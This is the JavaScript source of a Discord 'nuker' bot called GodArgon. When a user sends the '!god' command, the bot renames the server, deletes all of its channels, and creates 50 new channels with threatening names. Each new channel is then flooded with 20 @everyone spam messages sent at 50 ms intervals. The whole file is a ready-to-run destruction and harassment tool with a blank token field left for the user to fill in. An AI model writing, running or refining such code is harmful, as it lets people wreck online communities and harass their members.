const { Client, GatewayIntentBits } = require('discord.js');
const chalk = require('chalk');
const { exec } = require('child_process');

// Neon Blue color using chalk.hex
const neonBlueChalk = chalk.hex('#00FFFF');  // Neon Blue (Cyan)

const godArgonPrefix = '!';  // Updated prefix to reflect GodArgon
const godArgonToken = '';  // Add your bot token here

// Bot version (with beta tag)
const botVersion = '1.0.0';  // You can update this as needed

// Channel names to create, now darker and more destructive
const godArgonChannelNames = [
    '⚡️ GODARGON: TERMINATION ZONE ⚡️',
    ':fire: SYSTEM CRASHED - GODARGON IS HERE :fire:',
    ':warning: GODARGON IS IN CONTROL - UNLEASH HELL :warning:',
    ':boom: GODARGON STRIKE INCOMING :boom:',
    ':cloud_tornado: GODARGON: TOTAL DEVASTATION :cloud_tornado:',
    ':bomb: GODARGON NUKER ACTIVATED :bomb:',
    ':rotating_light: WARNING: GODARGON ALERT! :rotating_light:',
    '⚡️⚡️ GODARGON CHAOS UNLEASHED ⚡️⚡️',
    ':fire: GODARGON IS INFILTRATING NOW :fire:',
    ':crossed_swords: GODARGON ARMAGEDDON TRIGGERED :crossed_swords:'
];

// Server names for the bot to randomly change its name
const godArgonServerNames = [
    'GODARGON TERMINATION MODE',
    'GODARGON CHAOS STATE',
    'GODARGON FINAL STAGE',
    'GODARGON END OF DAYS'
];

// Aggressive spam messages for bot to send in channels
const godArgonSpamMessages = [
    `@everyone **\`\`\`:warning: GODARGON IS HERE TO DESTROY! :warning:\`\`\`**\n**:boom: SYSTEM MALFUNCTION! ALL CHANNELS COMPROMISED!**\n[GodArgon](https://media1.tenor.com/m/lnWSUML8qTcAAAAC/wumpus-wave-wave.gif)`,
    `@everyone **\`\`\`:fire: GODARGON NUKER IS ACTIVE! :fire:\`\`\`**\n**:rotating_light: GET READY FOR FULL ANNIHILATION!**\n[GodArgon](https://media1.tenor.com/m/lnWSUML8qTcAAAAC/wumpus-wave-wave.gif)`,
    `@everyone **\`\`\`:boom: SYSTEM OUTAGE - GODARGON HAS INITIATED! :boom:\`\`\`**\n**:cloud_tornado: COMPLETE DESTRUCTION MODE ENGAGED!**\n[GodArgon](https://media1.tenor.com/m/lnWSUML8qTcAAAAC/wumpus-wave-wave.gif)`,
    `@everyone **\`\`\`:rotating_light: GODARGON IS LOOSE! NUKER ENGAGED! :rotating_light:\`\`\`**\n**:fire: WE'RE GOING DOWN - NO ESCAPE!**\n[GodArgon](https://media1.tenor.com/m/lnWSUML8qTcAAAAC/wumpus-wave-wave.gif)`
];

// Faster delay function
const godArgonDelay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const godArgonClient = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildInvites
    ]
});

exec("cls && title GodArgon && mode 100,30");

godArgonClient.once('ready', () => {
    console.log(neonBlueChalk.bold(`
        [ COMMAND ] - ${godArgonPrefix}god
        BOT ONLINE LOGIN : ${godArgonClient.user.tag}
        Version: ${botVersion}`));

    godArgonClient.user.setActivity(`The end by GodArgon | Version ${botVersion}`, { type: 3 });
});

// Create multiple channels quickly
async function godArgonCreateChannels(guild, numberOfChannels) {
    const godArgonPromises = Array.from({ length: numberOfChannels }).map(() =>
        guild.channels.create({
            name: godArgonChannelNames[Math.floor(Math.random() * godArgonChannelNames.length)],
            type: 0
        })
    );

    return Promise.all(godArgonPromises);
}

godArgonClient.on('messageCreate', async (message) => {
    if (!message.content.startsWith(godArgonPrefix) || message.author.bot) return;

    const args = message.content.slice(godArgonPrefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'god') {
        const option = parseInt(args[0]) - 1;
        const godArgonServerName = godArgonServerNames[option] || godArgonServerNames[0];

        try {
            await message.guild.setName(godArgonServerName);
            const godArgonChannels = await message.guild.channels.fetch();
            await Promise.all(godArgonChannels.map(channel => channel.delete()));
            console.log(neonBlueChalk('Deleted all channels. Now creating new channels with GodArgon...'));
            await godArgonCreateChannels(message.guild, 50);  // 50 channels instead of a smaller number
            console.log(neonBlueChalk('Nuke operation completed! GodArgon'));
        } catch (error) {
            console.error(`Error running command: ${error}`);
        }
    }
});

godArgonClient.on('channelCreate', async (channel) => {
    const godArgonSpamIndex = Math.floor(Math.random() * godArgonSpamMessages.length);
    const godArgonSpamMessage = godArgonSpamMessages[godArgonSpamIndex];

    try {
        const permissions = channel.permissionsFor(godArgonClient.user);
        if (channel && permissions && permissions.has('SEND_MESSAGES')) {
            for (let i = 0; i < 20; i++) {  // Increased spam to 20 messages per channel for faster impact
                await channel.send(godArgonSpamMessage + " GodArgon");
                await godArgonDelay(50);  // Reduced delay to 50ms for faster spamming
            }

            console.log(neonBlueChalk(`Spam completed in channel: ${channel.name} by GodArgon`));
        } else {
            console.log(`Bot does not have permission to send messages in ${channel.name} or channel was deleted.`);
        }
    } catch (error) {
        console.error(`Error sending spam: ${error}`);
    }
});

// Handle other bot commands here...

godArgonClient.login(godArgonToken);
